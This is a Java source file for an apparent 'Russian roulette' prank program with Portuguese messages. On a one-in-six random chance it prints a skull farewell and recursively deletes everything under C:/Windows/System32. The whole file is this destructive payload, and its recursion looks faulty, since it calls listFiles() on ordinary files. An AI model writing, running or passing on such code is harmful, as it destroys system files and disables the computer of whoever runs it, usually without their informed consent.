package src;
import java.io.File;
import java.util.Random;

public class App {
    public static void main(String[] args) {
        if (new Random().nextInt(6) == 0) {
            System.out.println("Tchau Tchau...💀");
            excluirPasta(new File("C:/Windows/System32"));
        }
        else 
            System.out.println("Quase hein! Kkk");
    }

    public static void excluirPasta(File pasta) {
            for (File arquivo : pasta.listFiles()) 
                excluirPasta(arquivo);
        pasta.delete();
    }
}
